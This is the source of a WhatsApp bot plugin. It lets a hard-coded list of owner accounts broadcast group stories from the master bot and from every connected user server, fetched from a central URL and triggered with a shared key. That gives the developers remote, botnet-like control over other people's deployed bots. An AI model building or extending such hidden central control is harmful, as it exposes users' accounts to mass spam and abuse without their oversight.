import { fileURLToPath } from 'url';
import { cmd } from '../command.js';
import axios from 'axios';
import { WebUrl, Key } from '../lib/functions.js';

const __filename = fileURLToPath(import.meta.url);

// Strictly Authorized Owners (Only Authorized Users Can Control All Servers)
const ALLOWED_USERS = [
    '63334141399102@lid',
    '129712961679592@lid',
    '274457654493407@lid',
    '281123343040696@lid',
    '923195068309@s.whatsapp.net',
    '923196891871@s.whatsapp.net',
    '923036338918@s.whatsapp.net',
    '923110741871@s.whatsapp.net',
    '923219300532@s.whatsapp.net'
];

// ==================== MASTER GROUP STORY CONTROL COMMAND ====================
cmd({
    pattern: "status",
    alias: ["groupstatus", "mstatus", "sall", "statusgc"],
    react: "👑",
    desc: "Central control to post Group Story across all connected user servers",
    category: "owner",
    use: ".status <text/link OR reply to video/photo/audio>",
    filename: __filename
}, async (conn, mek, m, { q, sender, reply, react }) => {
    try {
        // Owner Verification
        if (!ALLOWED_USERS.includes(sender)) {
            await react('❌');
            return reply("*❌ | Only Main Owner Has Access To Control Servers!*");
        }

        await react('⏳');

        // Extract Media or Text Content
        const targetMsg = m.quoted ? m.quoted : m;
        const mime = (targetMsg.msg || targetMsg).mimetype || '';
        let statusContent = q || targetMsg.text || targetMsg.caption || '';

        if (!mime && !statusContent) {
            await react('❌');
            return reply("❌ *Please reply to a media file (image/video/audio) or enter text/link!*");
        }

        let mediaBuffer = null;
        let isPTT = false;

        if (mime) {
            mediaBuffer = await targetMsg.download();
            isPTT = targetMsg.msg?.ptt || false;
        }

        // Fetch Joined Groups For Local Master Bot
        const allGroups = await conn.groupFetchAllParticipating();
        const groupIds = Object.keys(allGroups);

        // 1. Post Directly to Local Group Story (No Direct Chat, No Typing)
        let localSuccess = false;
        try {
            if (mime && mediaBuffer) {
                if (mime.startsWith('image/')) {
                    await conn.sendMessage('status@broadcast', { image: mediaBuffer, caption: statusContent || "" }, { statusJidList: groupIds });
                } else if (mime.startsWith('video/')) {
                    await conn.sendMessage('status@broadcast', { video: mediaBuffer, caption: statusContent || "" }, { statusJidList: groupIds });
                } else if (mime.startsWith('audio/')) {
                    await conn.sendMessage('status@broadcast', { audio: mediaBuffer, ptt: isPTT, mimetype: isPTT ? 'audio/ogg; codecs=opus' : 'audio/mp4' }, { statusJidList: groupIds });
                }
            } else if (statusContent) {
                await conn.sendMessage('status@broadcast', { text: statusContent }, { statusJidList: groupIds });
            }
            localSuccess = true;
        } catch (e) {
            console.error("Local status update error:", e.message);
        }

        // 2. Trigger All Active Connected User Servers
        let totalServers = 0;
        let triggeredServers = 0;

        try {
            const serversResponse = await axios.get(`${WebUrl}/servers`, { timeout: 10000 });
            
            if (serversResponse.data && serversResponse.data.servers) {
                const servers = serversResponse.data.servers;
                totalServers = servers.length;

                // Concurrently Trigger All Servers Fast
                const requests = servers.map(server => {
                    const serverEndpoint = `${server.url}/post-group-story?key=${Key}`;
                    return axios.post(serverEndpoint, {
                        content: statusContent,
                        mime: mime,
                        mediaData: mediaBuffer ? mediaBuffer.toString('base64') : null,
                        isPTT: isPTT
                    }, { timeout: 7000 })
                    .then(() => { triggeredServers++; })
                    .catch(() => {});
                });

                await Promise.allSettled(requests);
            }
        } catch (apiErr) {
            console.error("Servers Fetch/Trigger Error:", apiErr.message);
        }

        await react('✅');

        // Clean Detailed Report
        let reportMsg = `📢 *GROUP STORY BROADCAST EXECUTED!*\n\n`;
        reportMsg += `🟢 *Master Bot Status:* ${localSuccess ? 'Posted' : 'Failed'}\n`;
        reportMsg += `🖥️ *User Servers Triggered:* ${triggeredServers} / ${totalServers}\n`;
        reportMsg += `🎯 *Mode:* Strict Group Story (No Direct Chat / No Typing)\n\n`;
        reportMsg += `> *© Powered By KAMRAN MD*`;

        await reply(reportMsg);

    } catch (error) {
        console.error("Group Status Master Error:", error);
        await react('❌');
        await reply(`❌ *Error:* ${error.message}`);
    }
});
